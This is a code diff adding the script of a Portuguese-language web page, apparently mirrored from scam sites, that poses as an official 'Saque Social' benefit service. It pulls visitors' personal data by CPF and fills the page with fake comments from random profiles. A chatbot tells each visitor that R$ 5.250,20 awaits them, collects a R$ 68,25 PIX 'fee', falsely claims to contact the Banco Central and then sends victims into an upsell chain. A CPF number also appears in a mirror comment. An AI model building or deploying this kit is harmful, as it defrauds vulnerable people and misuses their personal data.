+          createRandomComment(msg, false);
+          elements.fbLoadingSpan.textContent = "Comentários atualizados.";
+        }, (i + 1) * 10000);
+      });
+    }
+    async function createRandomComment(text, initial) {
+      totalComments++;
+      const userData = await getRandomUser();
+      createComment(userData.name.first, userData.picture.medium, text, 0, 0, initial);
+      storedComments.unshift({ name: userData.name.first, avatar: userData.picture.medium, text, likes: 0, dislikes: 0 });
+      if (!initial) saveCommentsToLocal();
+    }
+    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
+      const cItem = document.createElement('div');
+      cItem.classList.add('comment-item');
+      cItem.innerHTML = `
+        <img class="comment-avatar" src="${avatar}" alt="avatar"/>
+        <div class="comment-content">
+          <div class="comment-name">${name}</div>
+          <div class="comment-text">${text}</div>
+          <div class="comment-actions">
+            <span class="comment-likes"><i class="fas fa-thumbs-up"></i> ${likes}</span>
+            <span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> ${dislikes}</span>
+          </div>
+        </div>`;
+      elements.fbContainer.insertBefore(cItem, elements.fbContainer.firstChild);
+      if (!initialLoad) saveCommentsToLocal();
+    }
+    async function getRandomUser() {
+      const res = await fetch('https://randomuser.me/api/?nat=br');
+      const data = await res.json();
+      return data.results[0];
+    }
+    function saveCommentsToLocal() {
+      localStorage.setItem('commentsData', JSON.stringify(storedComments));
+    }
+    function formatDateBR(dateStr) {
+      const dateOnly = dateStr.split(' ')[0];
+      const [year, month, day] = dateOnly.split('-');
+      return `${day}/${month}/${year}`;
+    }
+    function formatarNomeCompleto(nome) {
+      if (!nome) return '';
+      return nome
+        .toLowerCase()
+        .split(' ')
+        .filter(p => p)
+        .map(p => p.charAt(0).toUpperCase() + p.slice(1))
+        .join(' ');
+    }
+    function formatarCPF1(cpf) {
+      const numeros = cpf.replace(/\D/g, '');
+      return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    let userData = null;
+    async function fetchUserData() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpf = urlParams.get('cpf');
+        if (!cpf) throw new Error('CPF não encontrado.');
+        const cleanCPF = cpf.replace(/\D/g, '');
+        const response = await fetch(`api.php?cpf=${cleanCPF}`);
+        if (!response.ok) throw new Error('API retornou erro: ' + response.status);
+        const data = await response.json();
+        if (data.status !== 200 || !data.nome) throw new Error('Dados não encontrados.');
+        userData = data;
+        
+        const nomeFormatado = formatarNomeCompleto(userData.nome || '');
+        const maeFormatada = (userData.mae && userData.mae.trim()) ? formatarNomeCompleto(userData.mae) : 'Não Informado';
+        
+        elements.nameSpan.textContent = nomeFormatado;
+        document.getElementById('header-user-name').textContent = nomeFormatado.split(' ')[0] || 'Usuário';
+        elements.cpfSpan.textContent = formatarCPF1(userData.cpf || cleanCPF);
+        elements.birthSpan.textContent = userData.nascimento || '';
+        elements.motherSpan.textContent = maeFormatada;
+      } catch (err) {
+        console.error('Erro ao buscar dados da API:', err);
+        const params = new URLSearchParams(window.location.search);
+        const cpfFallback = params.get('cpf');
+        if (cpfFallback) {
+          const cleanCPF = cpfFallback.replace(/\D/g, '');
+          elements.cpfSpan.textContent = formatarCPF1(cleanCPF);
+        }
+        const nomeFallback = params.get('nome');
+        if (nomeFallback) {
+          const nomeOk = formatarNomeCompleto(nomeFallback);
+          elements.nameSpan.textContent = nomeOk;
+          document.getElementById('header-user-name').textContent = nomeOk.split(' ')[0] || 'Usuário';
+        }
+        const nascFallback = params.get('nascimento');
+        if (nascFallback) elements.birthSpan.textContent = nascFallback;
+        const maeFallback = params.get('mae');
+        if (maeFallback) elements.motherSpan.textContent = formatarNomeCompleto(maeFallback);
+      } finally {
+        elements.loadingScreen.classList.add('hidden');
+        elements.mainContent.classList.remove('hidden');
+        initFacebookComments();
+      }
+    }
+
+    let chatStarted = false;
+    async function startChatFlow() {
+      const modal = document.getElementById('modal-chat');
+      if (modal) modal.classList.add('active');
+      if (chatStarted) return;
+      chatStarted = true;
+
+      const primeiroNome = (userData && userData.nome) ? formatarNomeCompleto(userData.nome).split(' ')[0] : 'Cidadão';
+      await botMessageWithTypingDelay(`Olá, <b>${primeiroNome}</b>! Seja bem-vindo ao sistema de liberação do <b>Saque Social</b>.`, 1200);
+      await botMessageWithTypingDelay(`Localizamos um saldo disponível no valor de <b>R$ 5.250,20</b> pronto para ser creditado em sua conta.`, 1800);
+      await botMessageWithTypingDelay(`Para onde deseja transferir o valor? Por favor, <b>digite sua chave Pix</b> no campo abaixo:`, 1800);
+    }
+
+    elements.buttonSaque.addEventListener('click', () => {
+      startChatFlow();
+    });
+
+    if (elements.closeModalBtn) {
+      elements.closeModalBtn.addEventListener('click', () => {
+        const modal = document.getElementById('modal-chat');
+        if (modal) modal.classList.remove('active');
+      });
+    }
+
+    if (elements.userInput) {
+      elements.userInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          elements.sendMessageBtn.click();
+        }
+      });
+    }
+
+    let pollInterval = null;
+    let paymentGenerated = false;
+
+    document.addEventListener('click', async (e) => {
+      const payBtn = e.target.closest('#pay-button');
+      if (payBtn) {
+        if (payBtn.disabled || paymentGenerated) return;
+        payBtn.disabled = true;
+        payBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando PIX Oficial...';
+
+        try {
+          const urlParams = new URLSearchParams(window.location.search);
+          const nomeCliente = (userData && userData.nome) ? userData.nome : (urlParams.get('nome') || 'Contribuinte');
+          const cpfCliente = (userData && userData.cpf) ? userData.cpf : (urlParams.get('cpf') || '');
+
+          const response = await fetch('pagamento.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              nome: nomeCliente,
+              cpf: cpfCliente,
+              amount: 6825 // R$ 68,25
+            })
+          });
+
+          const data = await response.json();
+
+          if (data && (data.success || data.brCode)) {
+            paymentGenerated = true;
+            payBtn.innerHTML = '<i class="fas fa-check"></i> PIX Gerado com Sucesso!';
+            payBtn.style.background = '#168821';
+
+            const qrImageHtml = data.brCodeBase64 ? 
+              `<div class="pix-qr-wrapper"><img src="${data.brCodeBase64}" alt="QR Code PIX" class="pix-qr-img"></div>` : '';
+
+            const linkBtnHtml = data.url ? 
+              `<a href="${data.url}" target="_blank" class="pix-link-btn"><i class="fas fa-external-link-alt"></i> Pagar via Link / Página de Pagamento</a>` : '';
+
+            const paymentCardHtml = `
+              <div class="pix-payment-box">
+                <div class="pix-title"><i class="fas fa-qrcode"></i> Pagamento da Tarifa via PIX</div>
+                <div class="pix-subtitle">Pague a taxa de <b>R$ 68,25</b> para liberação imediata do seu saque de <b>R$ 5.250,20</b>.</div>
+                ${qrImageHtml}
+                <div class="pix-instructions">Copie o código PIX Copia e Cola abaixo e cole no app do seu banco:</div>
+                <div class="pix-input-group">
+                  <input type="text" id="pix-copy-input" readonly value="${data.brCode}">
+                  <button type="button" id="copy-pix-btn" class="pix-btn-copy"><i class="fas fa-copy"></i> Copiar Código PIX</button>
+                </div>
+                ${linkBtnHtml}
+                <div class="pix-status-check" id="pix-status-indicator">
+                  <i class="fas fa-spinner fa-spin"></i> Aguardando confirmação do pagamento em tempo real...
+                </div>
+              </div>
+            `;
+
+            await botMessageWithTypingDelay(paymentCardHtml, 1200);
+
+            // Iniciar verificação de status do pagamento (polling)
+            if (data.id) {
+              startPaymentPolling(data.id);
+            }
+          } else {
+            throw new Error((data && data.error) ? data.error : 'Erro ao gerar Pix');
+          }
+        } catch (err) {
+          console.error('Erro ao gerar pagamento:', err);
+          payBtn.disabled = false;
+          payBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Tentar Novamente';
+          alert('Não foi possível gerar a chave Pix no momento. Por favor, tente novamente em instantes.');
+        }
+      }
+
+      // Handler para o botão de copiar PIX
+      const copyBtn = e.target.closest('#copy-pix-btn');
+      if (copyBtn) {
+        const input = document.getElementById('pix-copy-input');
+        if (input) {
+          input.select();
+          input.setSelectionRange(0, 99999);
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(input.value);
+          } else {
+            document.execCommand('copy');
+          }
+          const prev = copyBtn.innerHTML;
+          copyBtn.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+          copyBtn.style.background = '#0d6f18';
+          setTimeout(() => {
+            copyBtn.innerHTML = prev;
+            copyBtn.style.background = '';
+          }, 3000);
+        }
+      }
+    });
+
+    function startPaymentPolling(chargeId) {
+      if (pollInterval) clearInterval(pollInterval);
+      pollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`pagamento.php?action=consultar&id=${encodeURIComponent(chargeId)}`);
+          const resData = await res.json();
+          if (resData && (resData.paid || resData.paymentStatus === 'PAID' || resData.paymentStatus === 'RECIEVED' || resData.paymentStatus === 'RECEIVED' || resData.status === 'COMPLETED')) {
+            clearInterval(pollInterval);
+            const indicator = document.getElementById('pix-status-indicator');
+            if (indicator) {
+              indicator.style.background = '#e8f5e9';
+              indicator.style.borderColor = '#a5d6a7';
+              indicator.style.color = '#1b5e20';
+              indicator.innerHTML = '<i class="fas fa-check-circle" style="color: #168821; font-size: 16px;"></i> <b>Pagamento Aprovado com Sucesso!</b>';
+            }
+            await botMessageWithTypingDelay('<b>Parabéns!</b> Identificamos o recolhimento do imposto no valor de <b>R$ 68,25</b> com sucesso.', 1200);
+            await botMessageWithTypingDelay('<i class="fas fa-spinner fa-spin"></i> Conectando ao Banco Central para liberação e emissão da Ordem Bancária...', 1500);
+
+            setTimeout(() => {
+              const urlParams = new URLSearchParams(window.location.search);
+              const nomeFinal = (userData && userData.nome) ? userData.nome : (urlParams.get('nome') || 'Contribuinte');
+              const cpfFinal = (userData && userData.cpf) ? userData.cpf : (urlParams.get('cpf') || '');
+              try {
+                localStorage.setItem('userCPF', cpfFinal.replace(/\D/g, ''));
+                localStorage.setItem('userName', nomeFinal);
+              } catch(e) {}
+
+              // Transição suave automática para o primeiro Upsell (Etapa 1 de 4)
+              window.location.href = `upsell/1/?cpf=${encodeURIComponent(cpfFinal.replace(/\D/g, ''))}&nome=${encodeURIComponent(nomeFinal)}`;
+            }, 2000);
+          }
+        } catch (e) {
+          console.warn('Erro ao verificar status:', e);
+        }
+      }, 4000);
+    }
+
+    // Se a página for aberta com parâmetro chat=1, abre direto
+    const checkParams = new URLSearchParams(window.location.search);
+    if (checkParams.get('chat') === '1') {
+      setTimeout(() => startChatFlow(), 500);
+    }
+
+    fetchUserData();
+  </script>
+
+
+
+
+
+</body><!-- Mirrored from valorconsultadoonline2026.vercel.app/consulta.html?cpf=33311996801 by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Jun 2026 20:17:06 GMT -->
+<!-- Mirrored from valores-recebergv2.online/2/consulta.html? by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Oct 2026 21:00:27 GMT -->
+</html>
